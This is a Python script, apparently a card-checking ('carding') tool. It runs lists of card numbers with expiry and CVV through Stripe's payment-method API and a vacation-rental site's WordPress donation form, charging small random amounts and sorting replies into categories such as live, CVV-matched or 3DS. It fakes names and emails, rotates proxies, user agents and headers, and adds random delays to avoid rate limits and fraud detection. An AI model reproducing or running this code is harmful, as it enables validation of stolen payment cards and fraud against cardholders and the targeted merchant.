# gatet.py - Boutique Vacation Rentals Stripe Gateway
# Advanced Anti-Rate Limit with Multiple Bypass Techniques
import requests
import json
import time
import random
import uuid
import cloudscraper
from faker import Faker
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

fake = Faker("en_US")

# ========== RATE LIMIT BYPASS CONFIG ==========
# Multiple user agents rotating
USER_AGENTS = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    # Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Firefox Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    # Mobile Chrome
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    # Mobile Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

# Accept-Language headers rotating
LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
    "en-CA,en;q=0.9",
]

# Accept headers
ACCEPT_HEADERS = [
    "application/json, text/javascript, */*; q=0.01",
    "application/json, text/plain, */*",
    "*/*",
]

# Referers rotating
REFERERS = [
    "https://boutiquevacationrentals.cloud/payments/",
    "https://boutiquevacationrentals.cloud/",
    "https://www.google.com/",
    "https://boutiquevacationrentals.cloud/checkout/",
]

# ========== CLASSIFICATION KEYS ==========
success_keys = [
    "appreciate", "Payment Success", "redirect_to", "thank", "Thanks", 
    "redirectUrl", "succeeded", "confirmation", "Successful!", "Successful", 
    "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!", 
    "donation", "complete", "Payment successful"
]
ccn_keys = [
    "security code is incorrect", "INCORRECT_CVV", 
    "card number is incorrect", "invalid", "Your card number is incorrect"
]
declined_keys = [
    "cannot be processed", "CARD_DECLINED", "Your card was declined.", 
    "generic_decline", "declined"
]
cvv_keys = [
    "transaction_not_allowed", 
    "Your card does not support this type of purchase", 
    "do_not_honor", "CVC"
]
insufficient_keys = [
    "insufficient", "INSUFFICIENT_FUNDS", 
    "Insufficient Funds", "low funds"
]
expired_keys = ["card has expired"]
otp_keys = [
    "Verifying", "action_required", "verifying", "call_next_method",
    "requires_source_action", "requires_action", "3d_secure", "authenticate"
]

def classify_response(last):
    """Classify gateway response"""
    if not last:
        return "DEAD"
    last_lower = str(last).lower()
    if any(key.lower() in last_lower for key in success_keys):
        return "HIT"
    if any(key.lower() in last_lower for key in otp_keys):
        return "3DS"
    if any(key.lower() in last_lower for key in ccn_keys):
        return "CCN"
    if any(key.lower() in last_lower for key in cvv_keys):
        return "CVV"
    if any(key.lower() in last_lower for key in insufficient_keys):
        return "INSUFFICIENT"
    if any(key.lower() in last_lower for key in expired_keys):
        return "EXPIRED"
    if any(key.lower() in last_lower for key in declined_keys):
        return "DECLINED"
    return "DEAD"

# ========== SESSION FACTORY ==========
def create_session(use_proxy=False, proxy_dict=None):
    """Create a session with retry logic and random headers"""
    session = requests.Session()
    
    # Retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    # Random headers for each session
    session.headers.update({
        'User-Agent': random.choice(USER_AGENTS),
        'Accept-Language': random.choice(LANGUAGES),
        'Accept': random.choice(ACCEPT_HEADERS),
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': f'"{random.choice(["Windows", "macOS", "Linux"])}"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
    })
    
    return session

def gen_random_amount():
    """Generate random amount between 0.50 and 1.50"""
    cents = random.randint(50, 150)
    return f"{cents // 100}.{cents % 100:02d}"

# ========== PROXY MANAGER ==========
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists("proxy.txt"):
                with open("proxy.txt", "r") as f:
                    self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print(f"[PROXY] Loaded {len(self.proxies)} proxies")
        except Exception as e:
            print(f"[PROXY] Error loading: {e}")
    
    def get_next_proxy(self):
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

proxy_manager = ProxyManager()

# ========== MAIN TELE FUNCTION ==========
def Tele(ccx: str, proxies: dict = None):
    """
    Check credit card with advanced anti-rate limit techniques
    Always returns string: "message|amount|time"
    """
    start_time = time.time()
    
    # Parse card
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            elapsed = round(time.time() - start_time, 1)
            return f"ERROR: Invalid card format|0.00|{elapsed}"

        n, mm, yy, cvc = parts
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:4]
    except:
        elapsed = round(time.time() - start_time, 1)
        return f"ERROR: Card parsing failed|0.00|{elapsed}"

    charge_amount = gen_random_amount()
    first_name, last_name = fake.first_name(), fake.last_name()
    email = f"{first_name.lower()}{random.randint(1000, 99999)}@{random.choice(['gmail.com', 'outlook.com', 'yahoo.com'])}"
    phone = f"07{random.randint(10000000, 99999999)}"

    # Generate unique IDs
    guid = f"{uuid.uuid4()}{random.randint(10000, 99999)}"
    muid = f"{uuid.uuid4()}{random.randint(10000, 99999)}"
    sid = f"{uuid.uuid4()}{random.randint(10000, 99999)}"
    client_session_id = f"{uuid.uuid4()}{random.randint(10000, 99999)}"
    wallet_config_id = str(uuid.uuid4())

    stripe_key = "pk_live_51ODCnuBD8XiDzI9igICxOfdXhUKRPtd7m4dnxVox4wgwab2pxtZ2uGmt2lZzQPHkWsM7U8QwYPEr1m31qVNTvuBf00ZcLWATAo"

    # Create fresh session with random headers
    session = create_session()
    
    # Apply proxy
    if proxies:
        session.proxies.update(proxies)
    else:
        # Auto-rotate proxy from pool
        auto_proxy = proxy_manager.get_next_proxy()
        if auto_proxy:
            session.proxies.update(auto_proxy)
    
    # Random cookies
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    session.cookies.set('_ga', f'GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}')
    session.cookies.set('_gid', f'GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}')
    
    # ===== STEP 1: Create Payment Method =====
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    
    stripe_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/39914d4bef; stripe-js-v3/39914d4bef; card-element',
        'referrer': random.choice(REFERERS),
        'time_on_page': str(random.randint(30000, 120000)),
        'client_attribution_metadata[client_session_id]': client_session_id,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'client_attribution_metadata[wallet_config_id]': wallet_config_id,
        'key': stripe_key
    }
    
    # Random delay before request (avoid pattern detection)
    time.sleep(random.uniform(0.1, 0.5))
    
    try:
        resp = session.post(url_stripe, data=stripe_data, timeout=30)
    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return f"NETWORK_ERROR|{charge_amount}|{elapsed}"

    # Handle rate limiting
    if resp.status_code == 429:
        wait_time = random.uniform(2, 5)
        time.sleep(wait_time)
        # Retry with new session
        session = create_session()
        if proxies:
            session.proxies.update(proxies)
        try:
            resp = session.post(url_stripe, data=stripe_data, timeout=30)
        except:
            elapsed = round(time.time() - start_time, 1)
            return f"NETWORK_ERROR|{charge_amount}|{elapsed}"

    if resp.status_code != 200:
        try:
            err_msg = resp.json().get('error', {}).get('message', 'Unknown')
        except:
            err_msg = resp.text[:200]
        
        elapsed = round(time.time() - start_time, 1)
        err_lower = str(err_msg).lower()
        
        if any(kw in err_lower for kw in ['number', 'invalid']):
            return f"Your card number is incorrect|{charge_amount}|{elapsed}"
        if any(kw in err_lower for kw in ['cvc', 'cvv', 'security']):
            return f"security code is incorrect|{charge_amount}|{elapsed}"
        if 'expired' in err_lower:
            return f"card has expired|{charge_amount}|{elapsed}"
        if 'insufficient' in err_lower:
            return f"insufficient funds|{charge_amount}|{elapsed}"
        if 'declined' in err_lower:
            return f"Your card was declined.|{charge_amount}|{elapsed}"
        if any(kw in err_lower for kw in ['3d', 'authenticate']):
            return f"3D Secure authentication required|{charge_amount}|{elapsed}"
        
        return f"STRIPE_ERROR: {err_msg[:80]}|{charge_amount}|{elapsed}"

    try:
        resp_json = resp.json()
        payment_method_id = resp_json.get('id')
        if not payment_method_id:
            elapsed = round(time.time() - start_time, 1)
            return f"STRIPE_ERROR: No PM ID|{charge_amount}|{elapsed}"
    except:
        elapsed = round(time.time() - start_time, 1)
        return f"JSON_PARSE_ERROR|{charge_amount}|{elapsed}"

    # ===== STEP 2: Submit to WordPress =====
    url_wp = "https://boutiquevacationrentals.cloud/wp-admin/admin-ajax.php"
    
    datetime_now = f"{random.randint(1,28)}/{random.randint(1,12)}/{random.randint(2026,2027)}"
    datetime_future = f"{random.randint(1,28)}/{random.randint(1,12)}/{random.randint(2026,2027)}"
    numeric = random.randint(1000, 9999)

    wp_data = {
        'data': (
            f'__fluent_form_embded_post_id=2858'
            f'&_fluentform_3_fluentformnonce=d625de3bed'
            f'&_wp_http_referer=%2Fpayments%2F'
            f'&names[first_name]={first_name}'
            f'&names[last_name]={last_name}'
            f'&email={email}'
            f'&phone={phone}'
            f'&input_text='
            f'&datetime={datetime_now}'
            f'&datetime_1={datetime_future}'
            f'&numeric_field={numeric}'
            f'&custom-payment-amount={charge_amount}'
            f'&payment_method=stripe'
            f'&__stripe_payment_method_id={payment_method_id}'
        ),
        'action': 'fluentform_submit',
        'form_id': '3'
    }

    # New headers for WP request
    wp_headers = {
        'Accept': random.choice(ACCEPT_HEADERS),
        'Accept-Language': random.choice(LANGUAGES),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://boutiquevacationrentals.cloud',
        'Referer': random.choice(REFERERS),
        'User-Agent': random.choice(USER_AGENTS),
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }

    # Random delay
    time.sleep(random.uniform(0.2, 0.8))

    try:
        r2 = session.post(url_wp, data=wp_data, headers=wp_headers, timeout=30)
    except:
        elapsed = round(time.time() - start_time, 1)
        return f"NETWORK_ERROR|{charge_amount}|{elapsed}"

    elapsed = round(time.time() - start_time, 1)

    # Parse response
    try:
        resp_json = r2.json()

        # Handle "restricted" / rate limit
        if 'errors' in resp_json:
            errors = resp_json['errors']
            if isinstance(errors, dict) and 'restricted' in errors:
                return f"Your card was declined.|{charge_amount}|{elapsed}"
            
            if isinstance(errors, dict):
                error_text = " ".join([msg if isinstance(msg, str) else " ".join(msg) for msg in errors.values()])
            else:
                error_text = str(errors)
                
            status = classify_response(error_text)
            return format_response(status, error_text, charge_amount, elapsed)

        if resp_json.get('success') == True:
            return f"Thank you for your donation!|{charge_amount}|{elapsed}"

        message = resp_json.get('message', str(resp_json))
        status = classify_response(message)
        return format_response(status, message, charge_amount, elapsed)

    except:
        text = r2.text[:200]
        if "thank" in text.lower():
            return f"Thank you for your donation!|{charge_amount}|{elapsed}"
        status = classify_response(text)
        return format_response(status, text, charge_amount, elapsed)

def format_response(status, message, amount, elapsed):
    """Format response"""
    if status == "HIT":
        return f"Thank you for your donation!|{amount}|{elapsed}"
    elif status in ["CCN", "CVV"]:
        return f"security code is incorrect|{amount}|{elapsed}"
    elif status == "3DS":
        return f"3D Secure authentication required|{amount}|{elapsed}"
    elif status == "INSUFFICIENT":
        return f"insufficient funds|{amount}|{elapsed}"
    elif status == "EXPIRED":
        return f"card has expired|{amount}|{elapsed}"
    elif status == "DECLINED":
        return f"Your card was declined.|{amount}|{elapsed}"
    else:
        clean_msg = str(message).replace("{", "").replace("}", "").replace("'", "")[:80]
        return f"DEAD - {clean_msg}|{amount}|{elapsed}"

# ========== TEST ==========
if __name__ == "__main__":
    import os
    test = "5344560017991222|10|29|900"
    print(Tele(test))
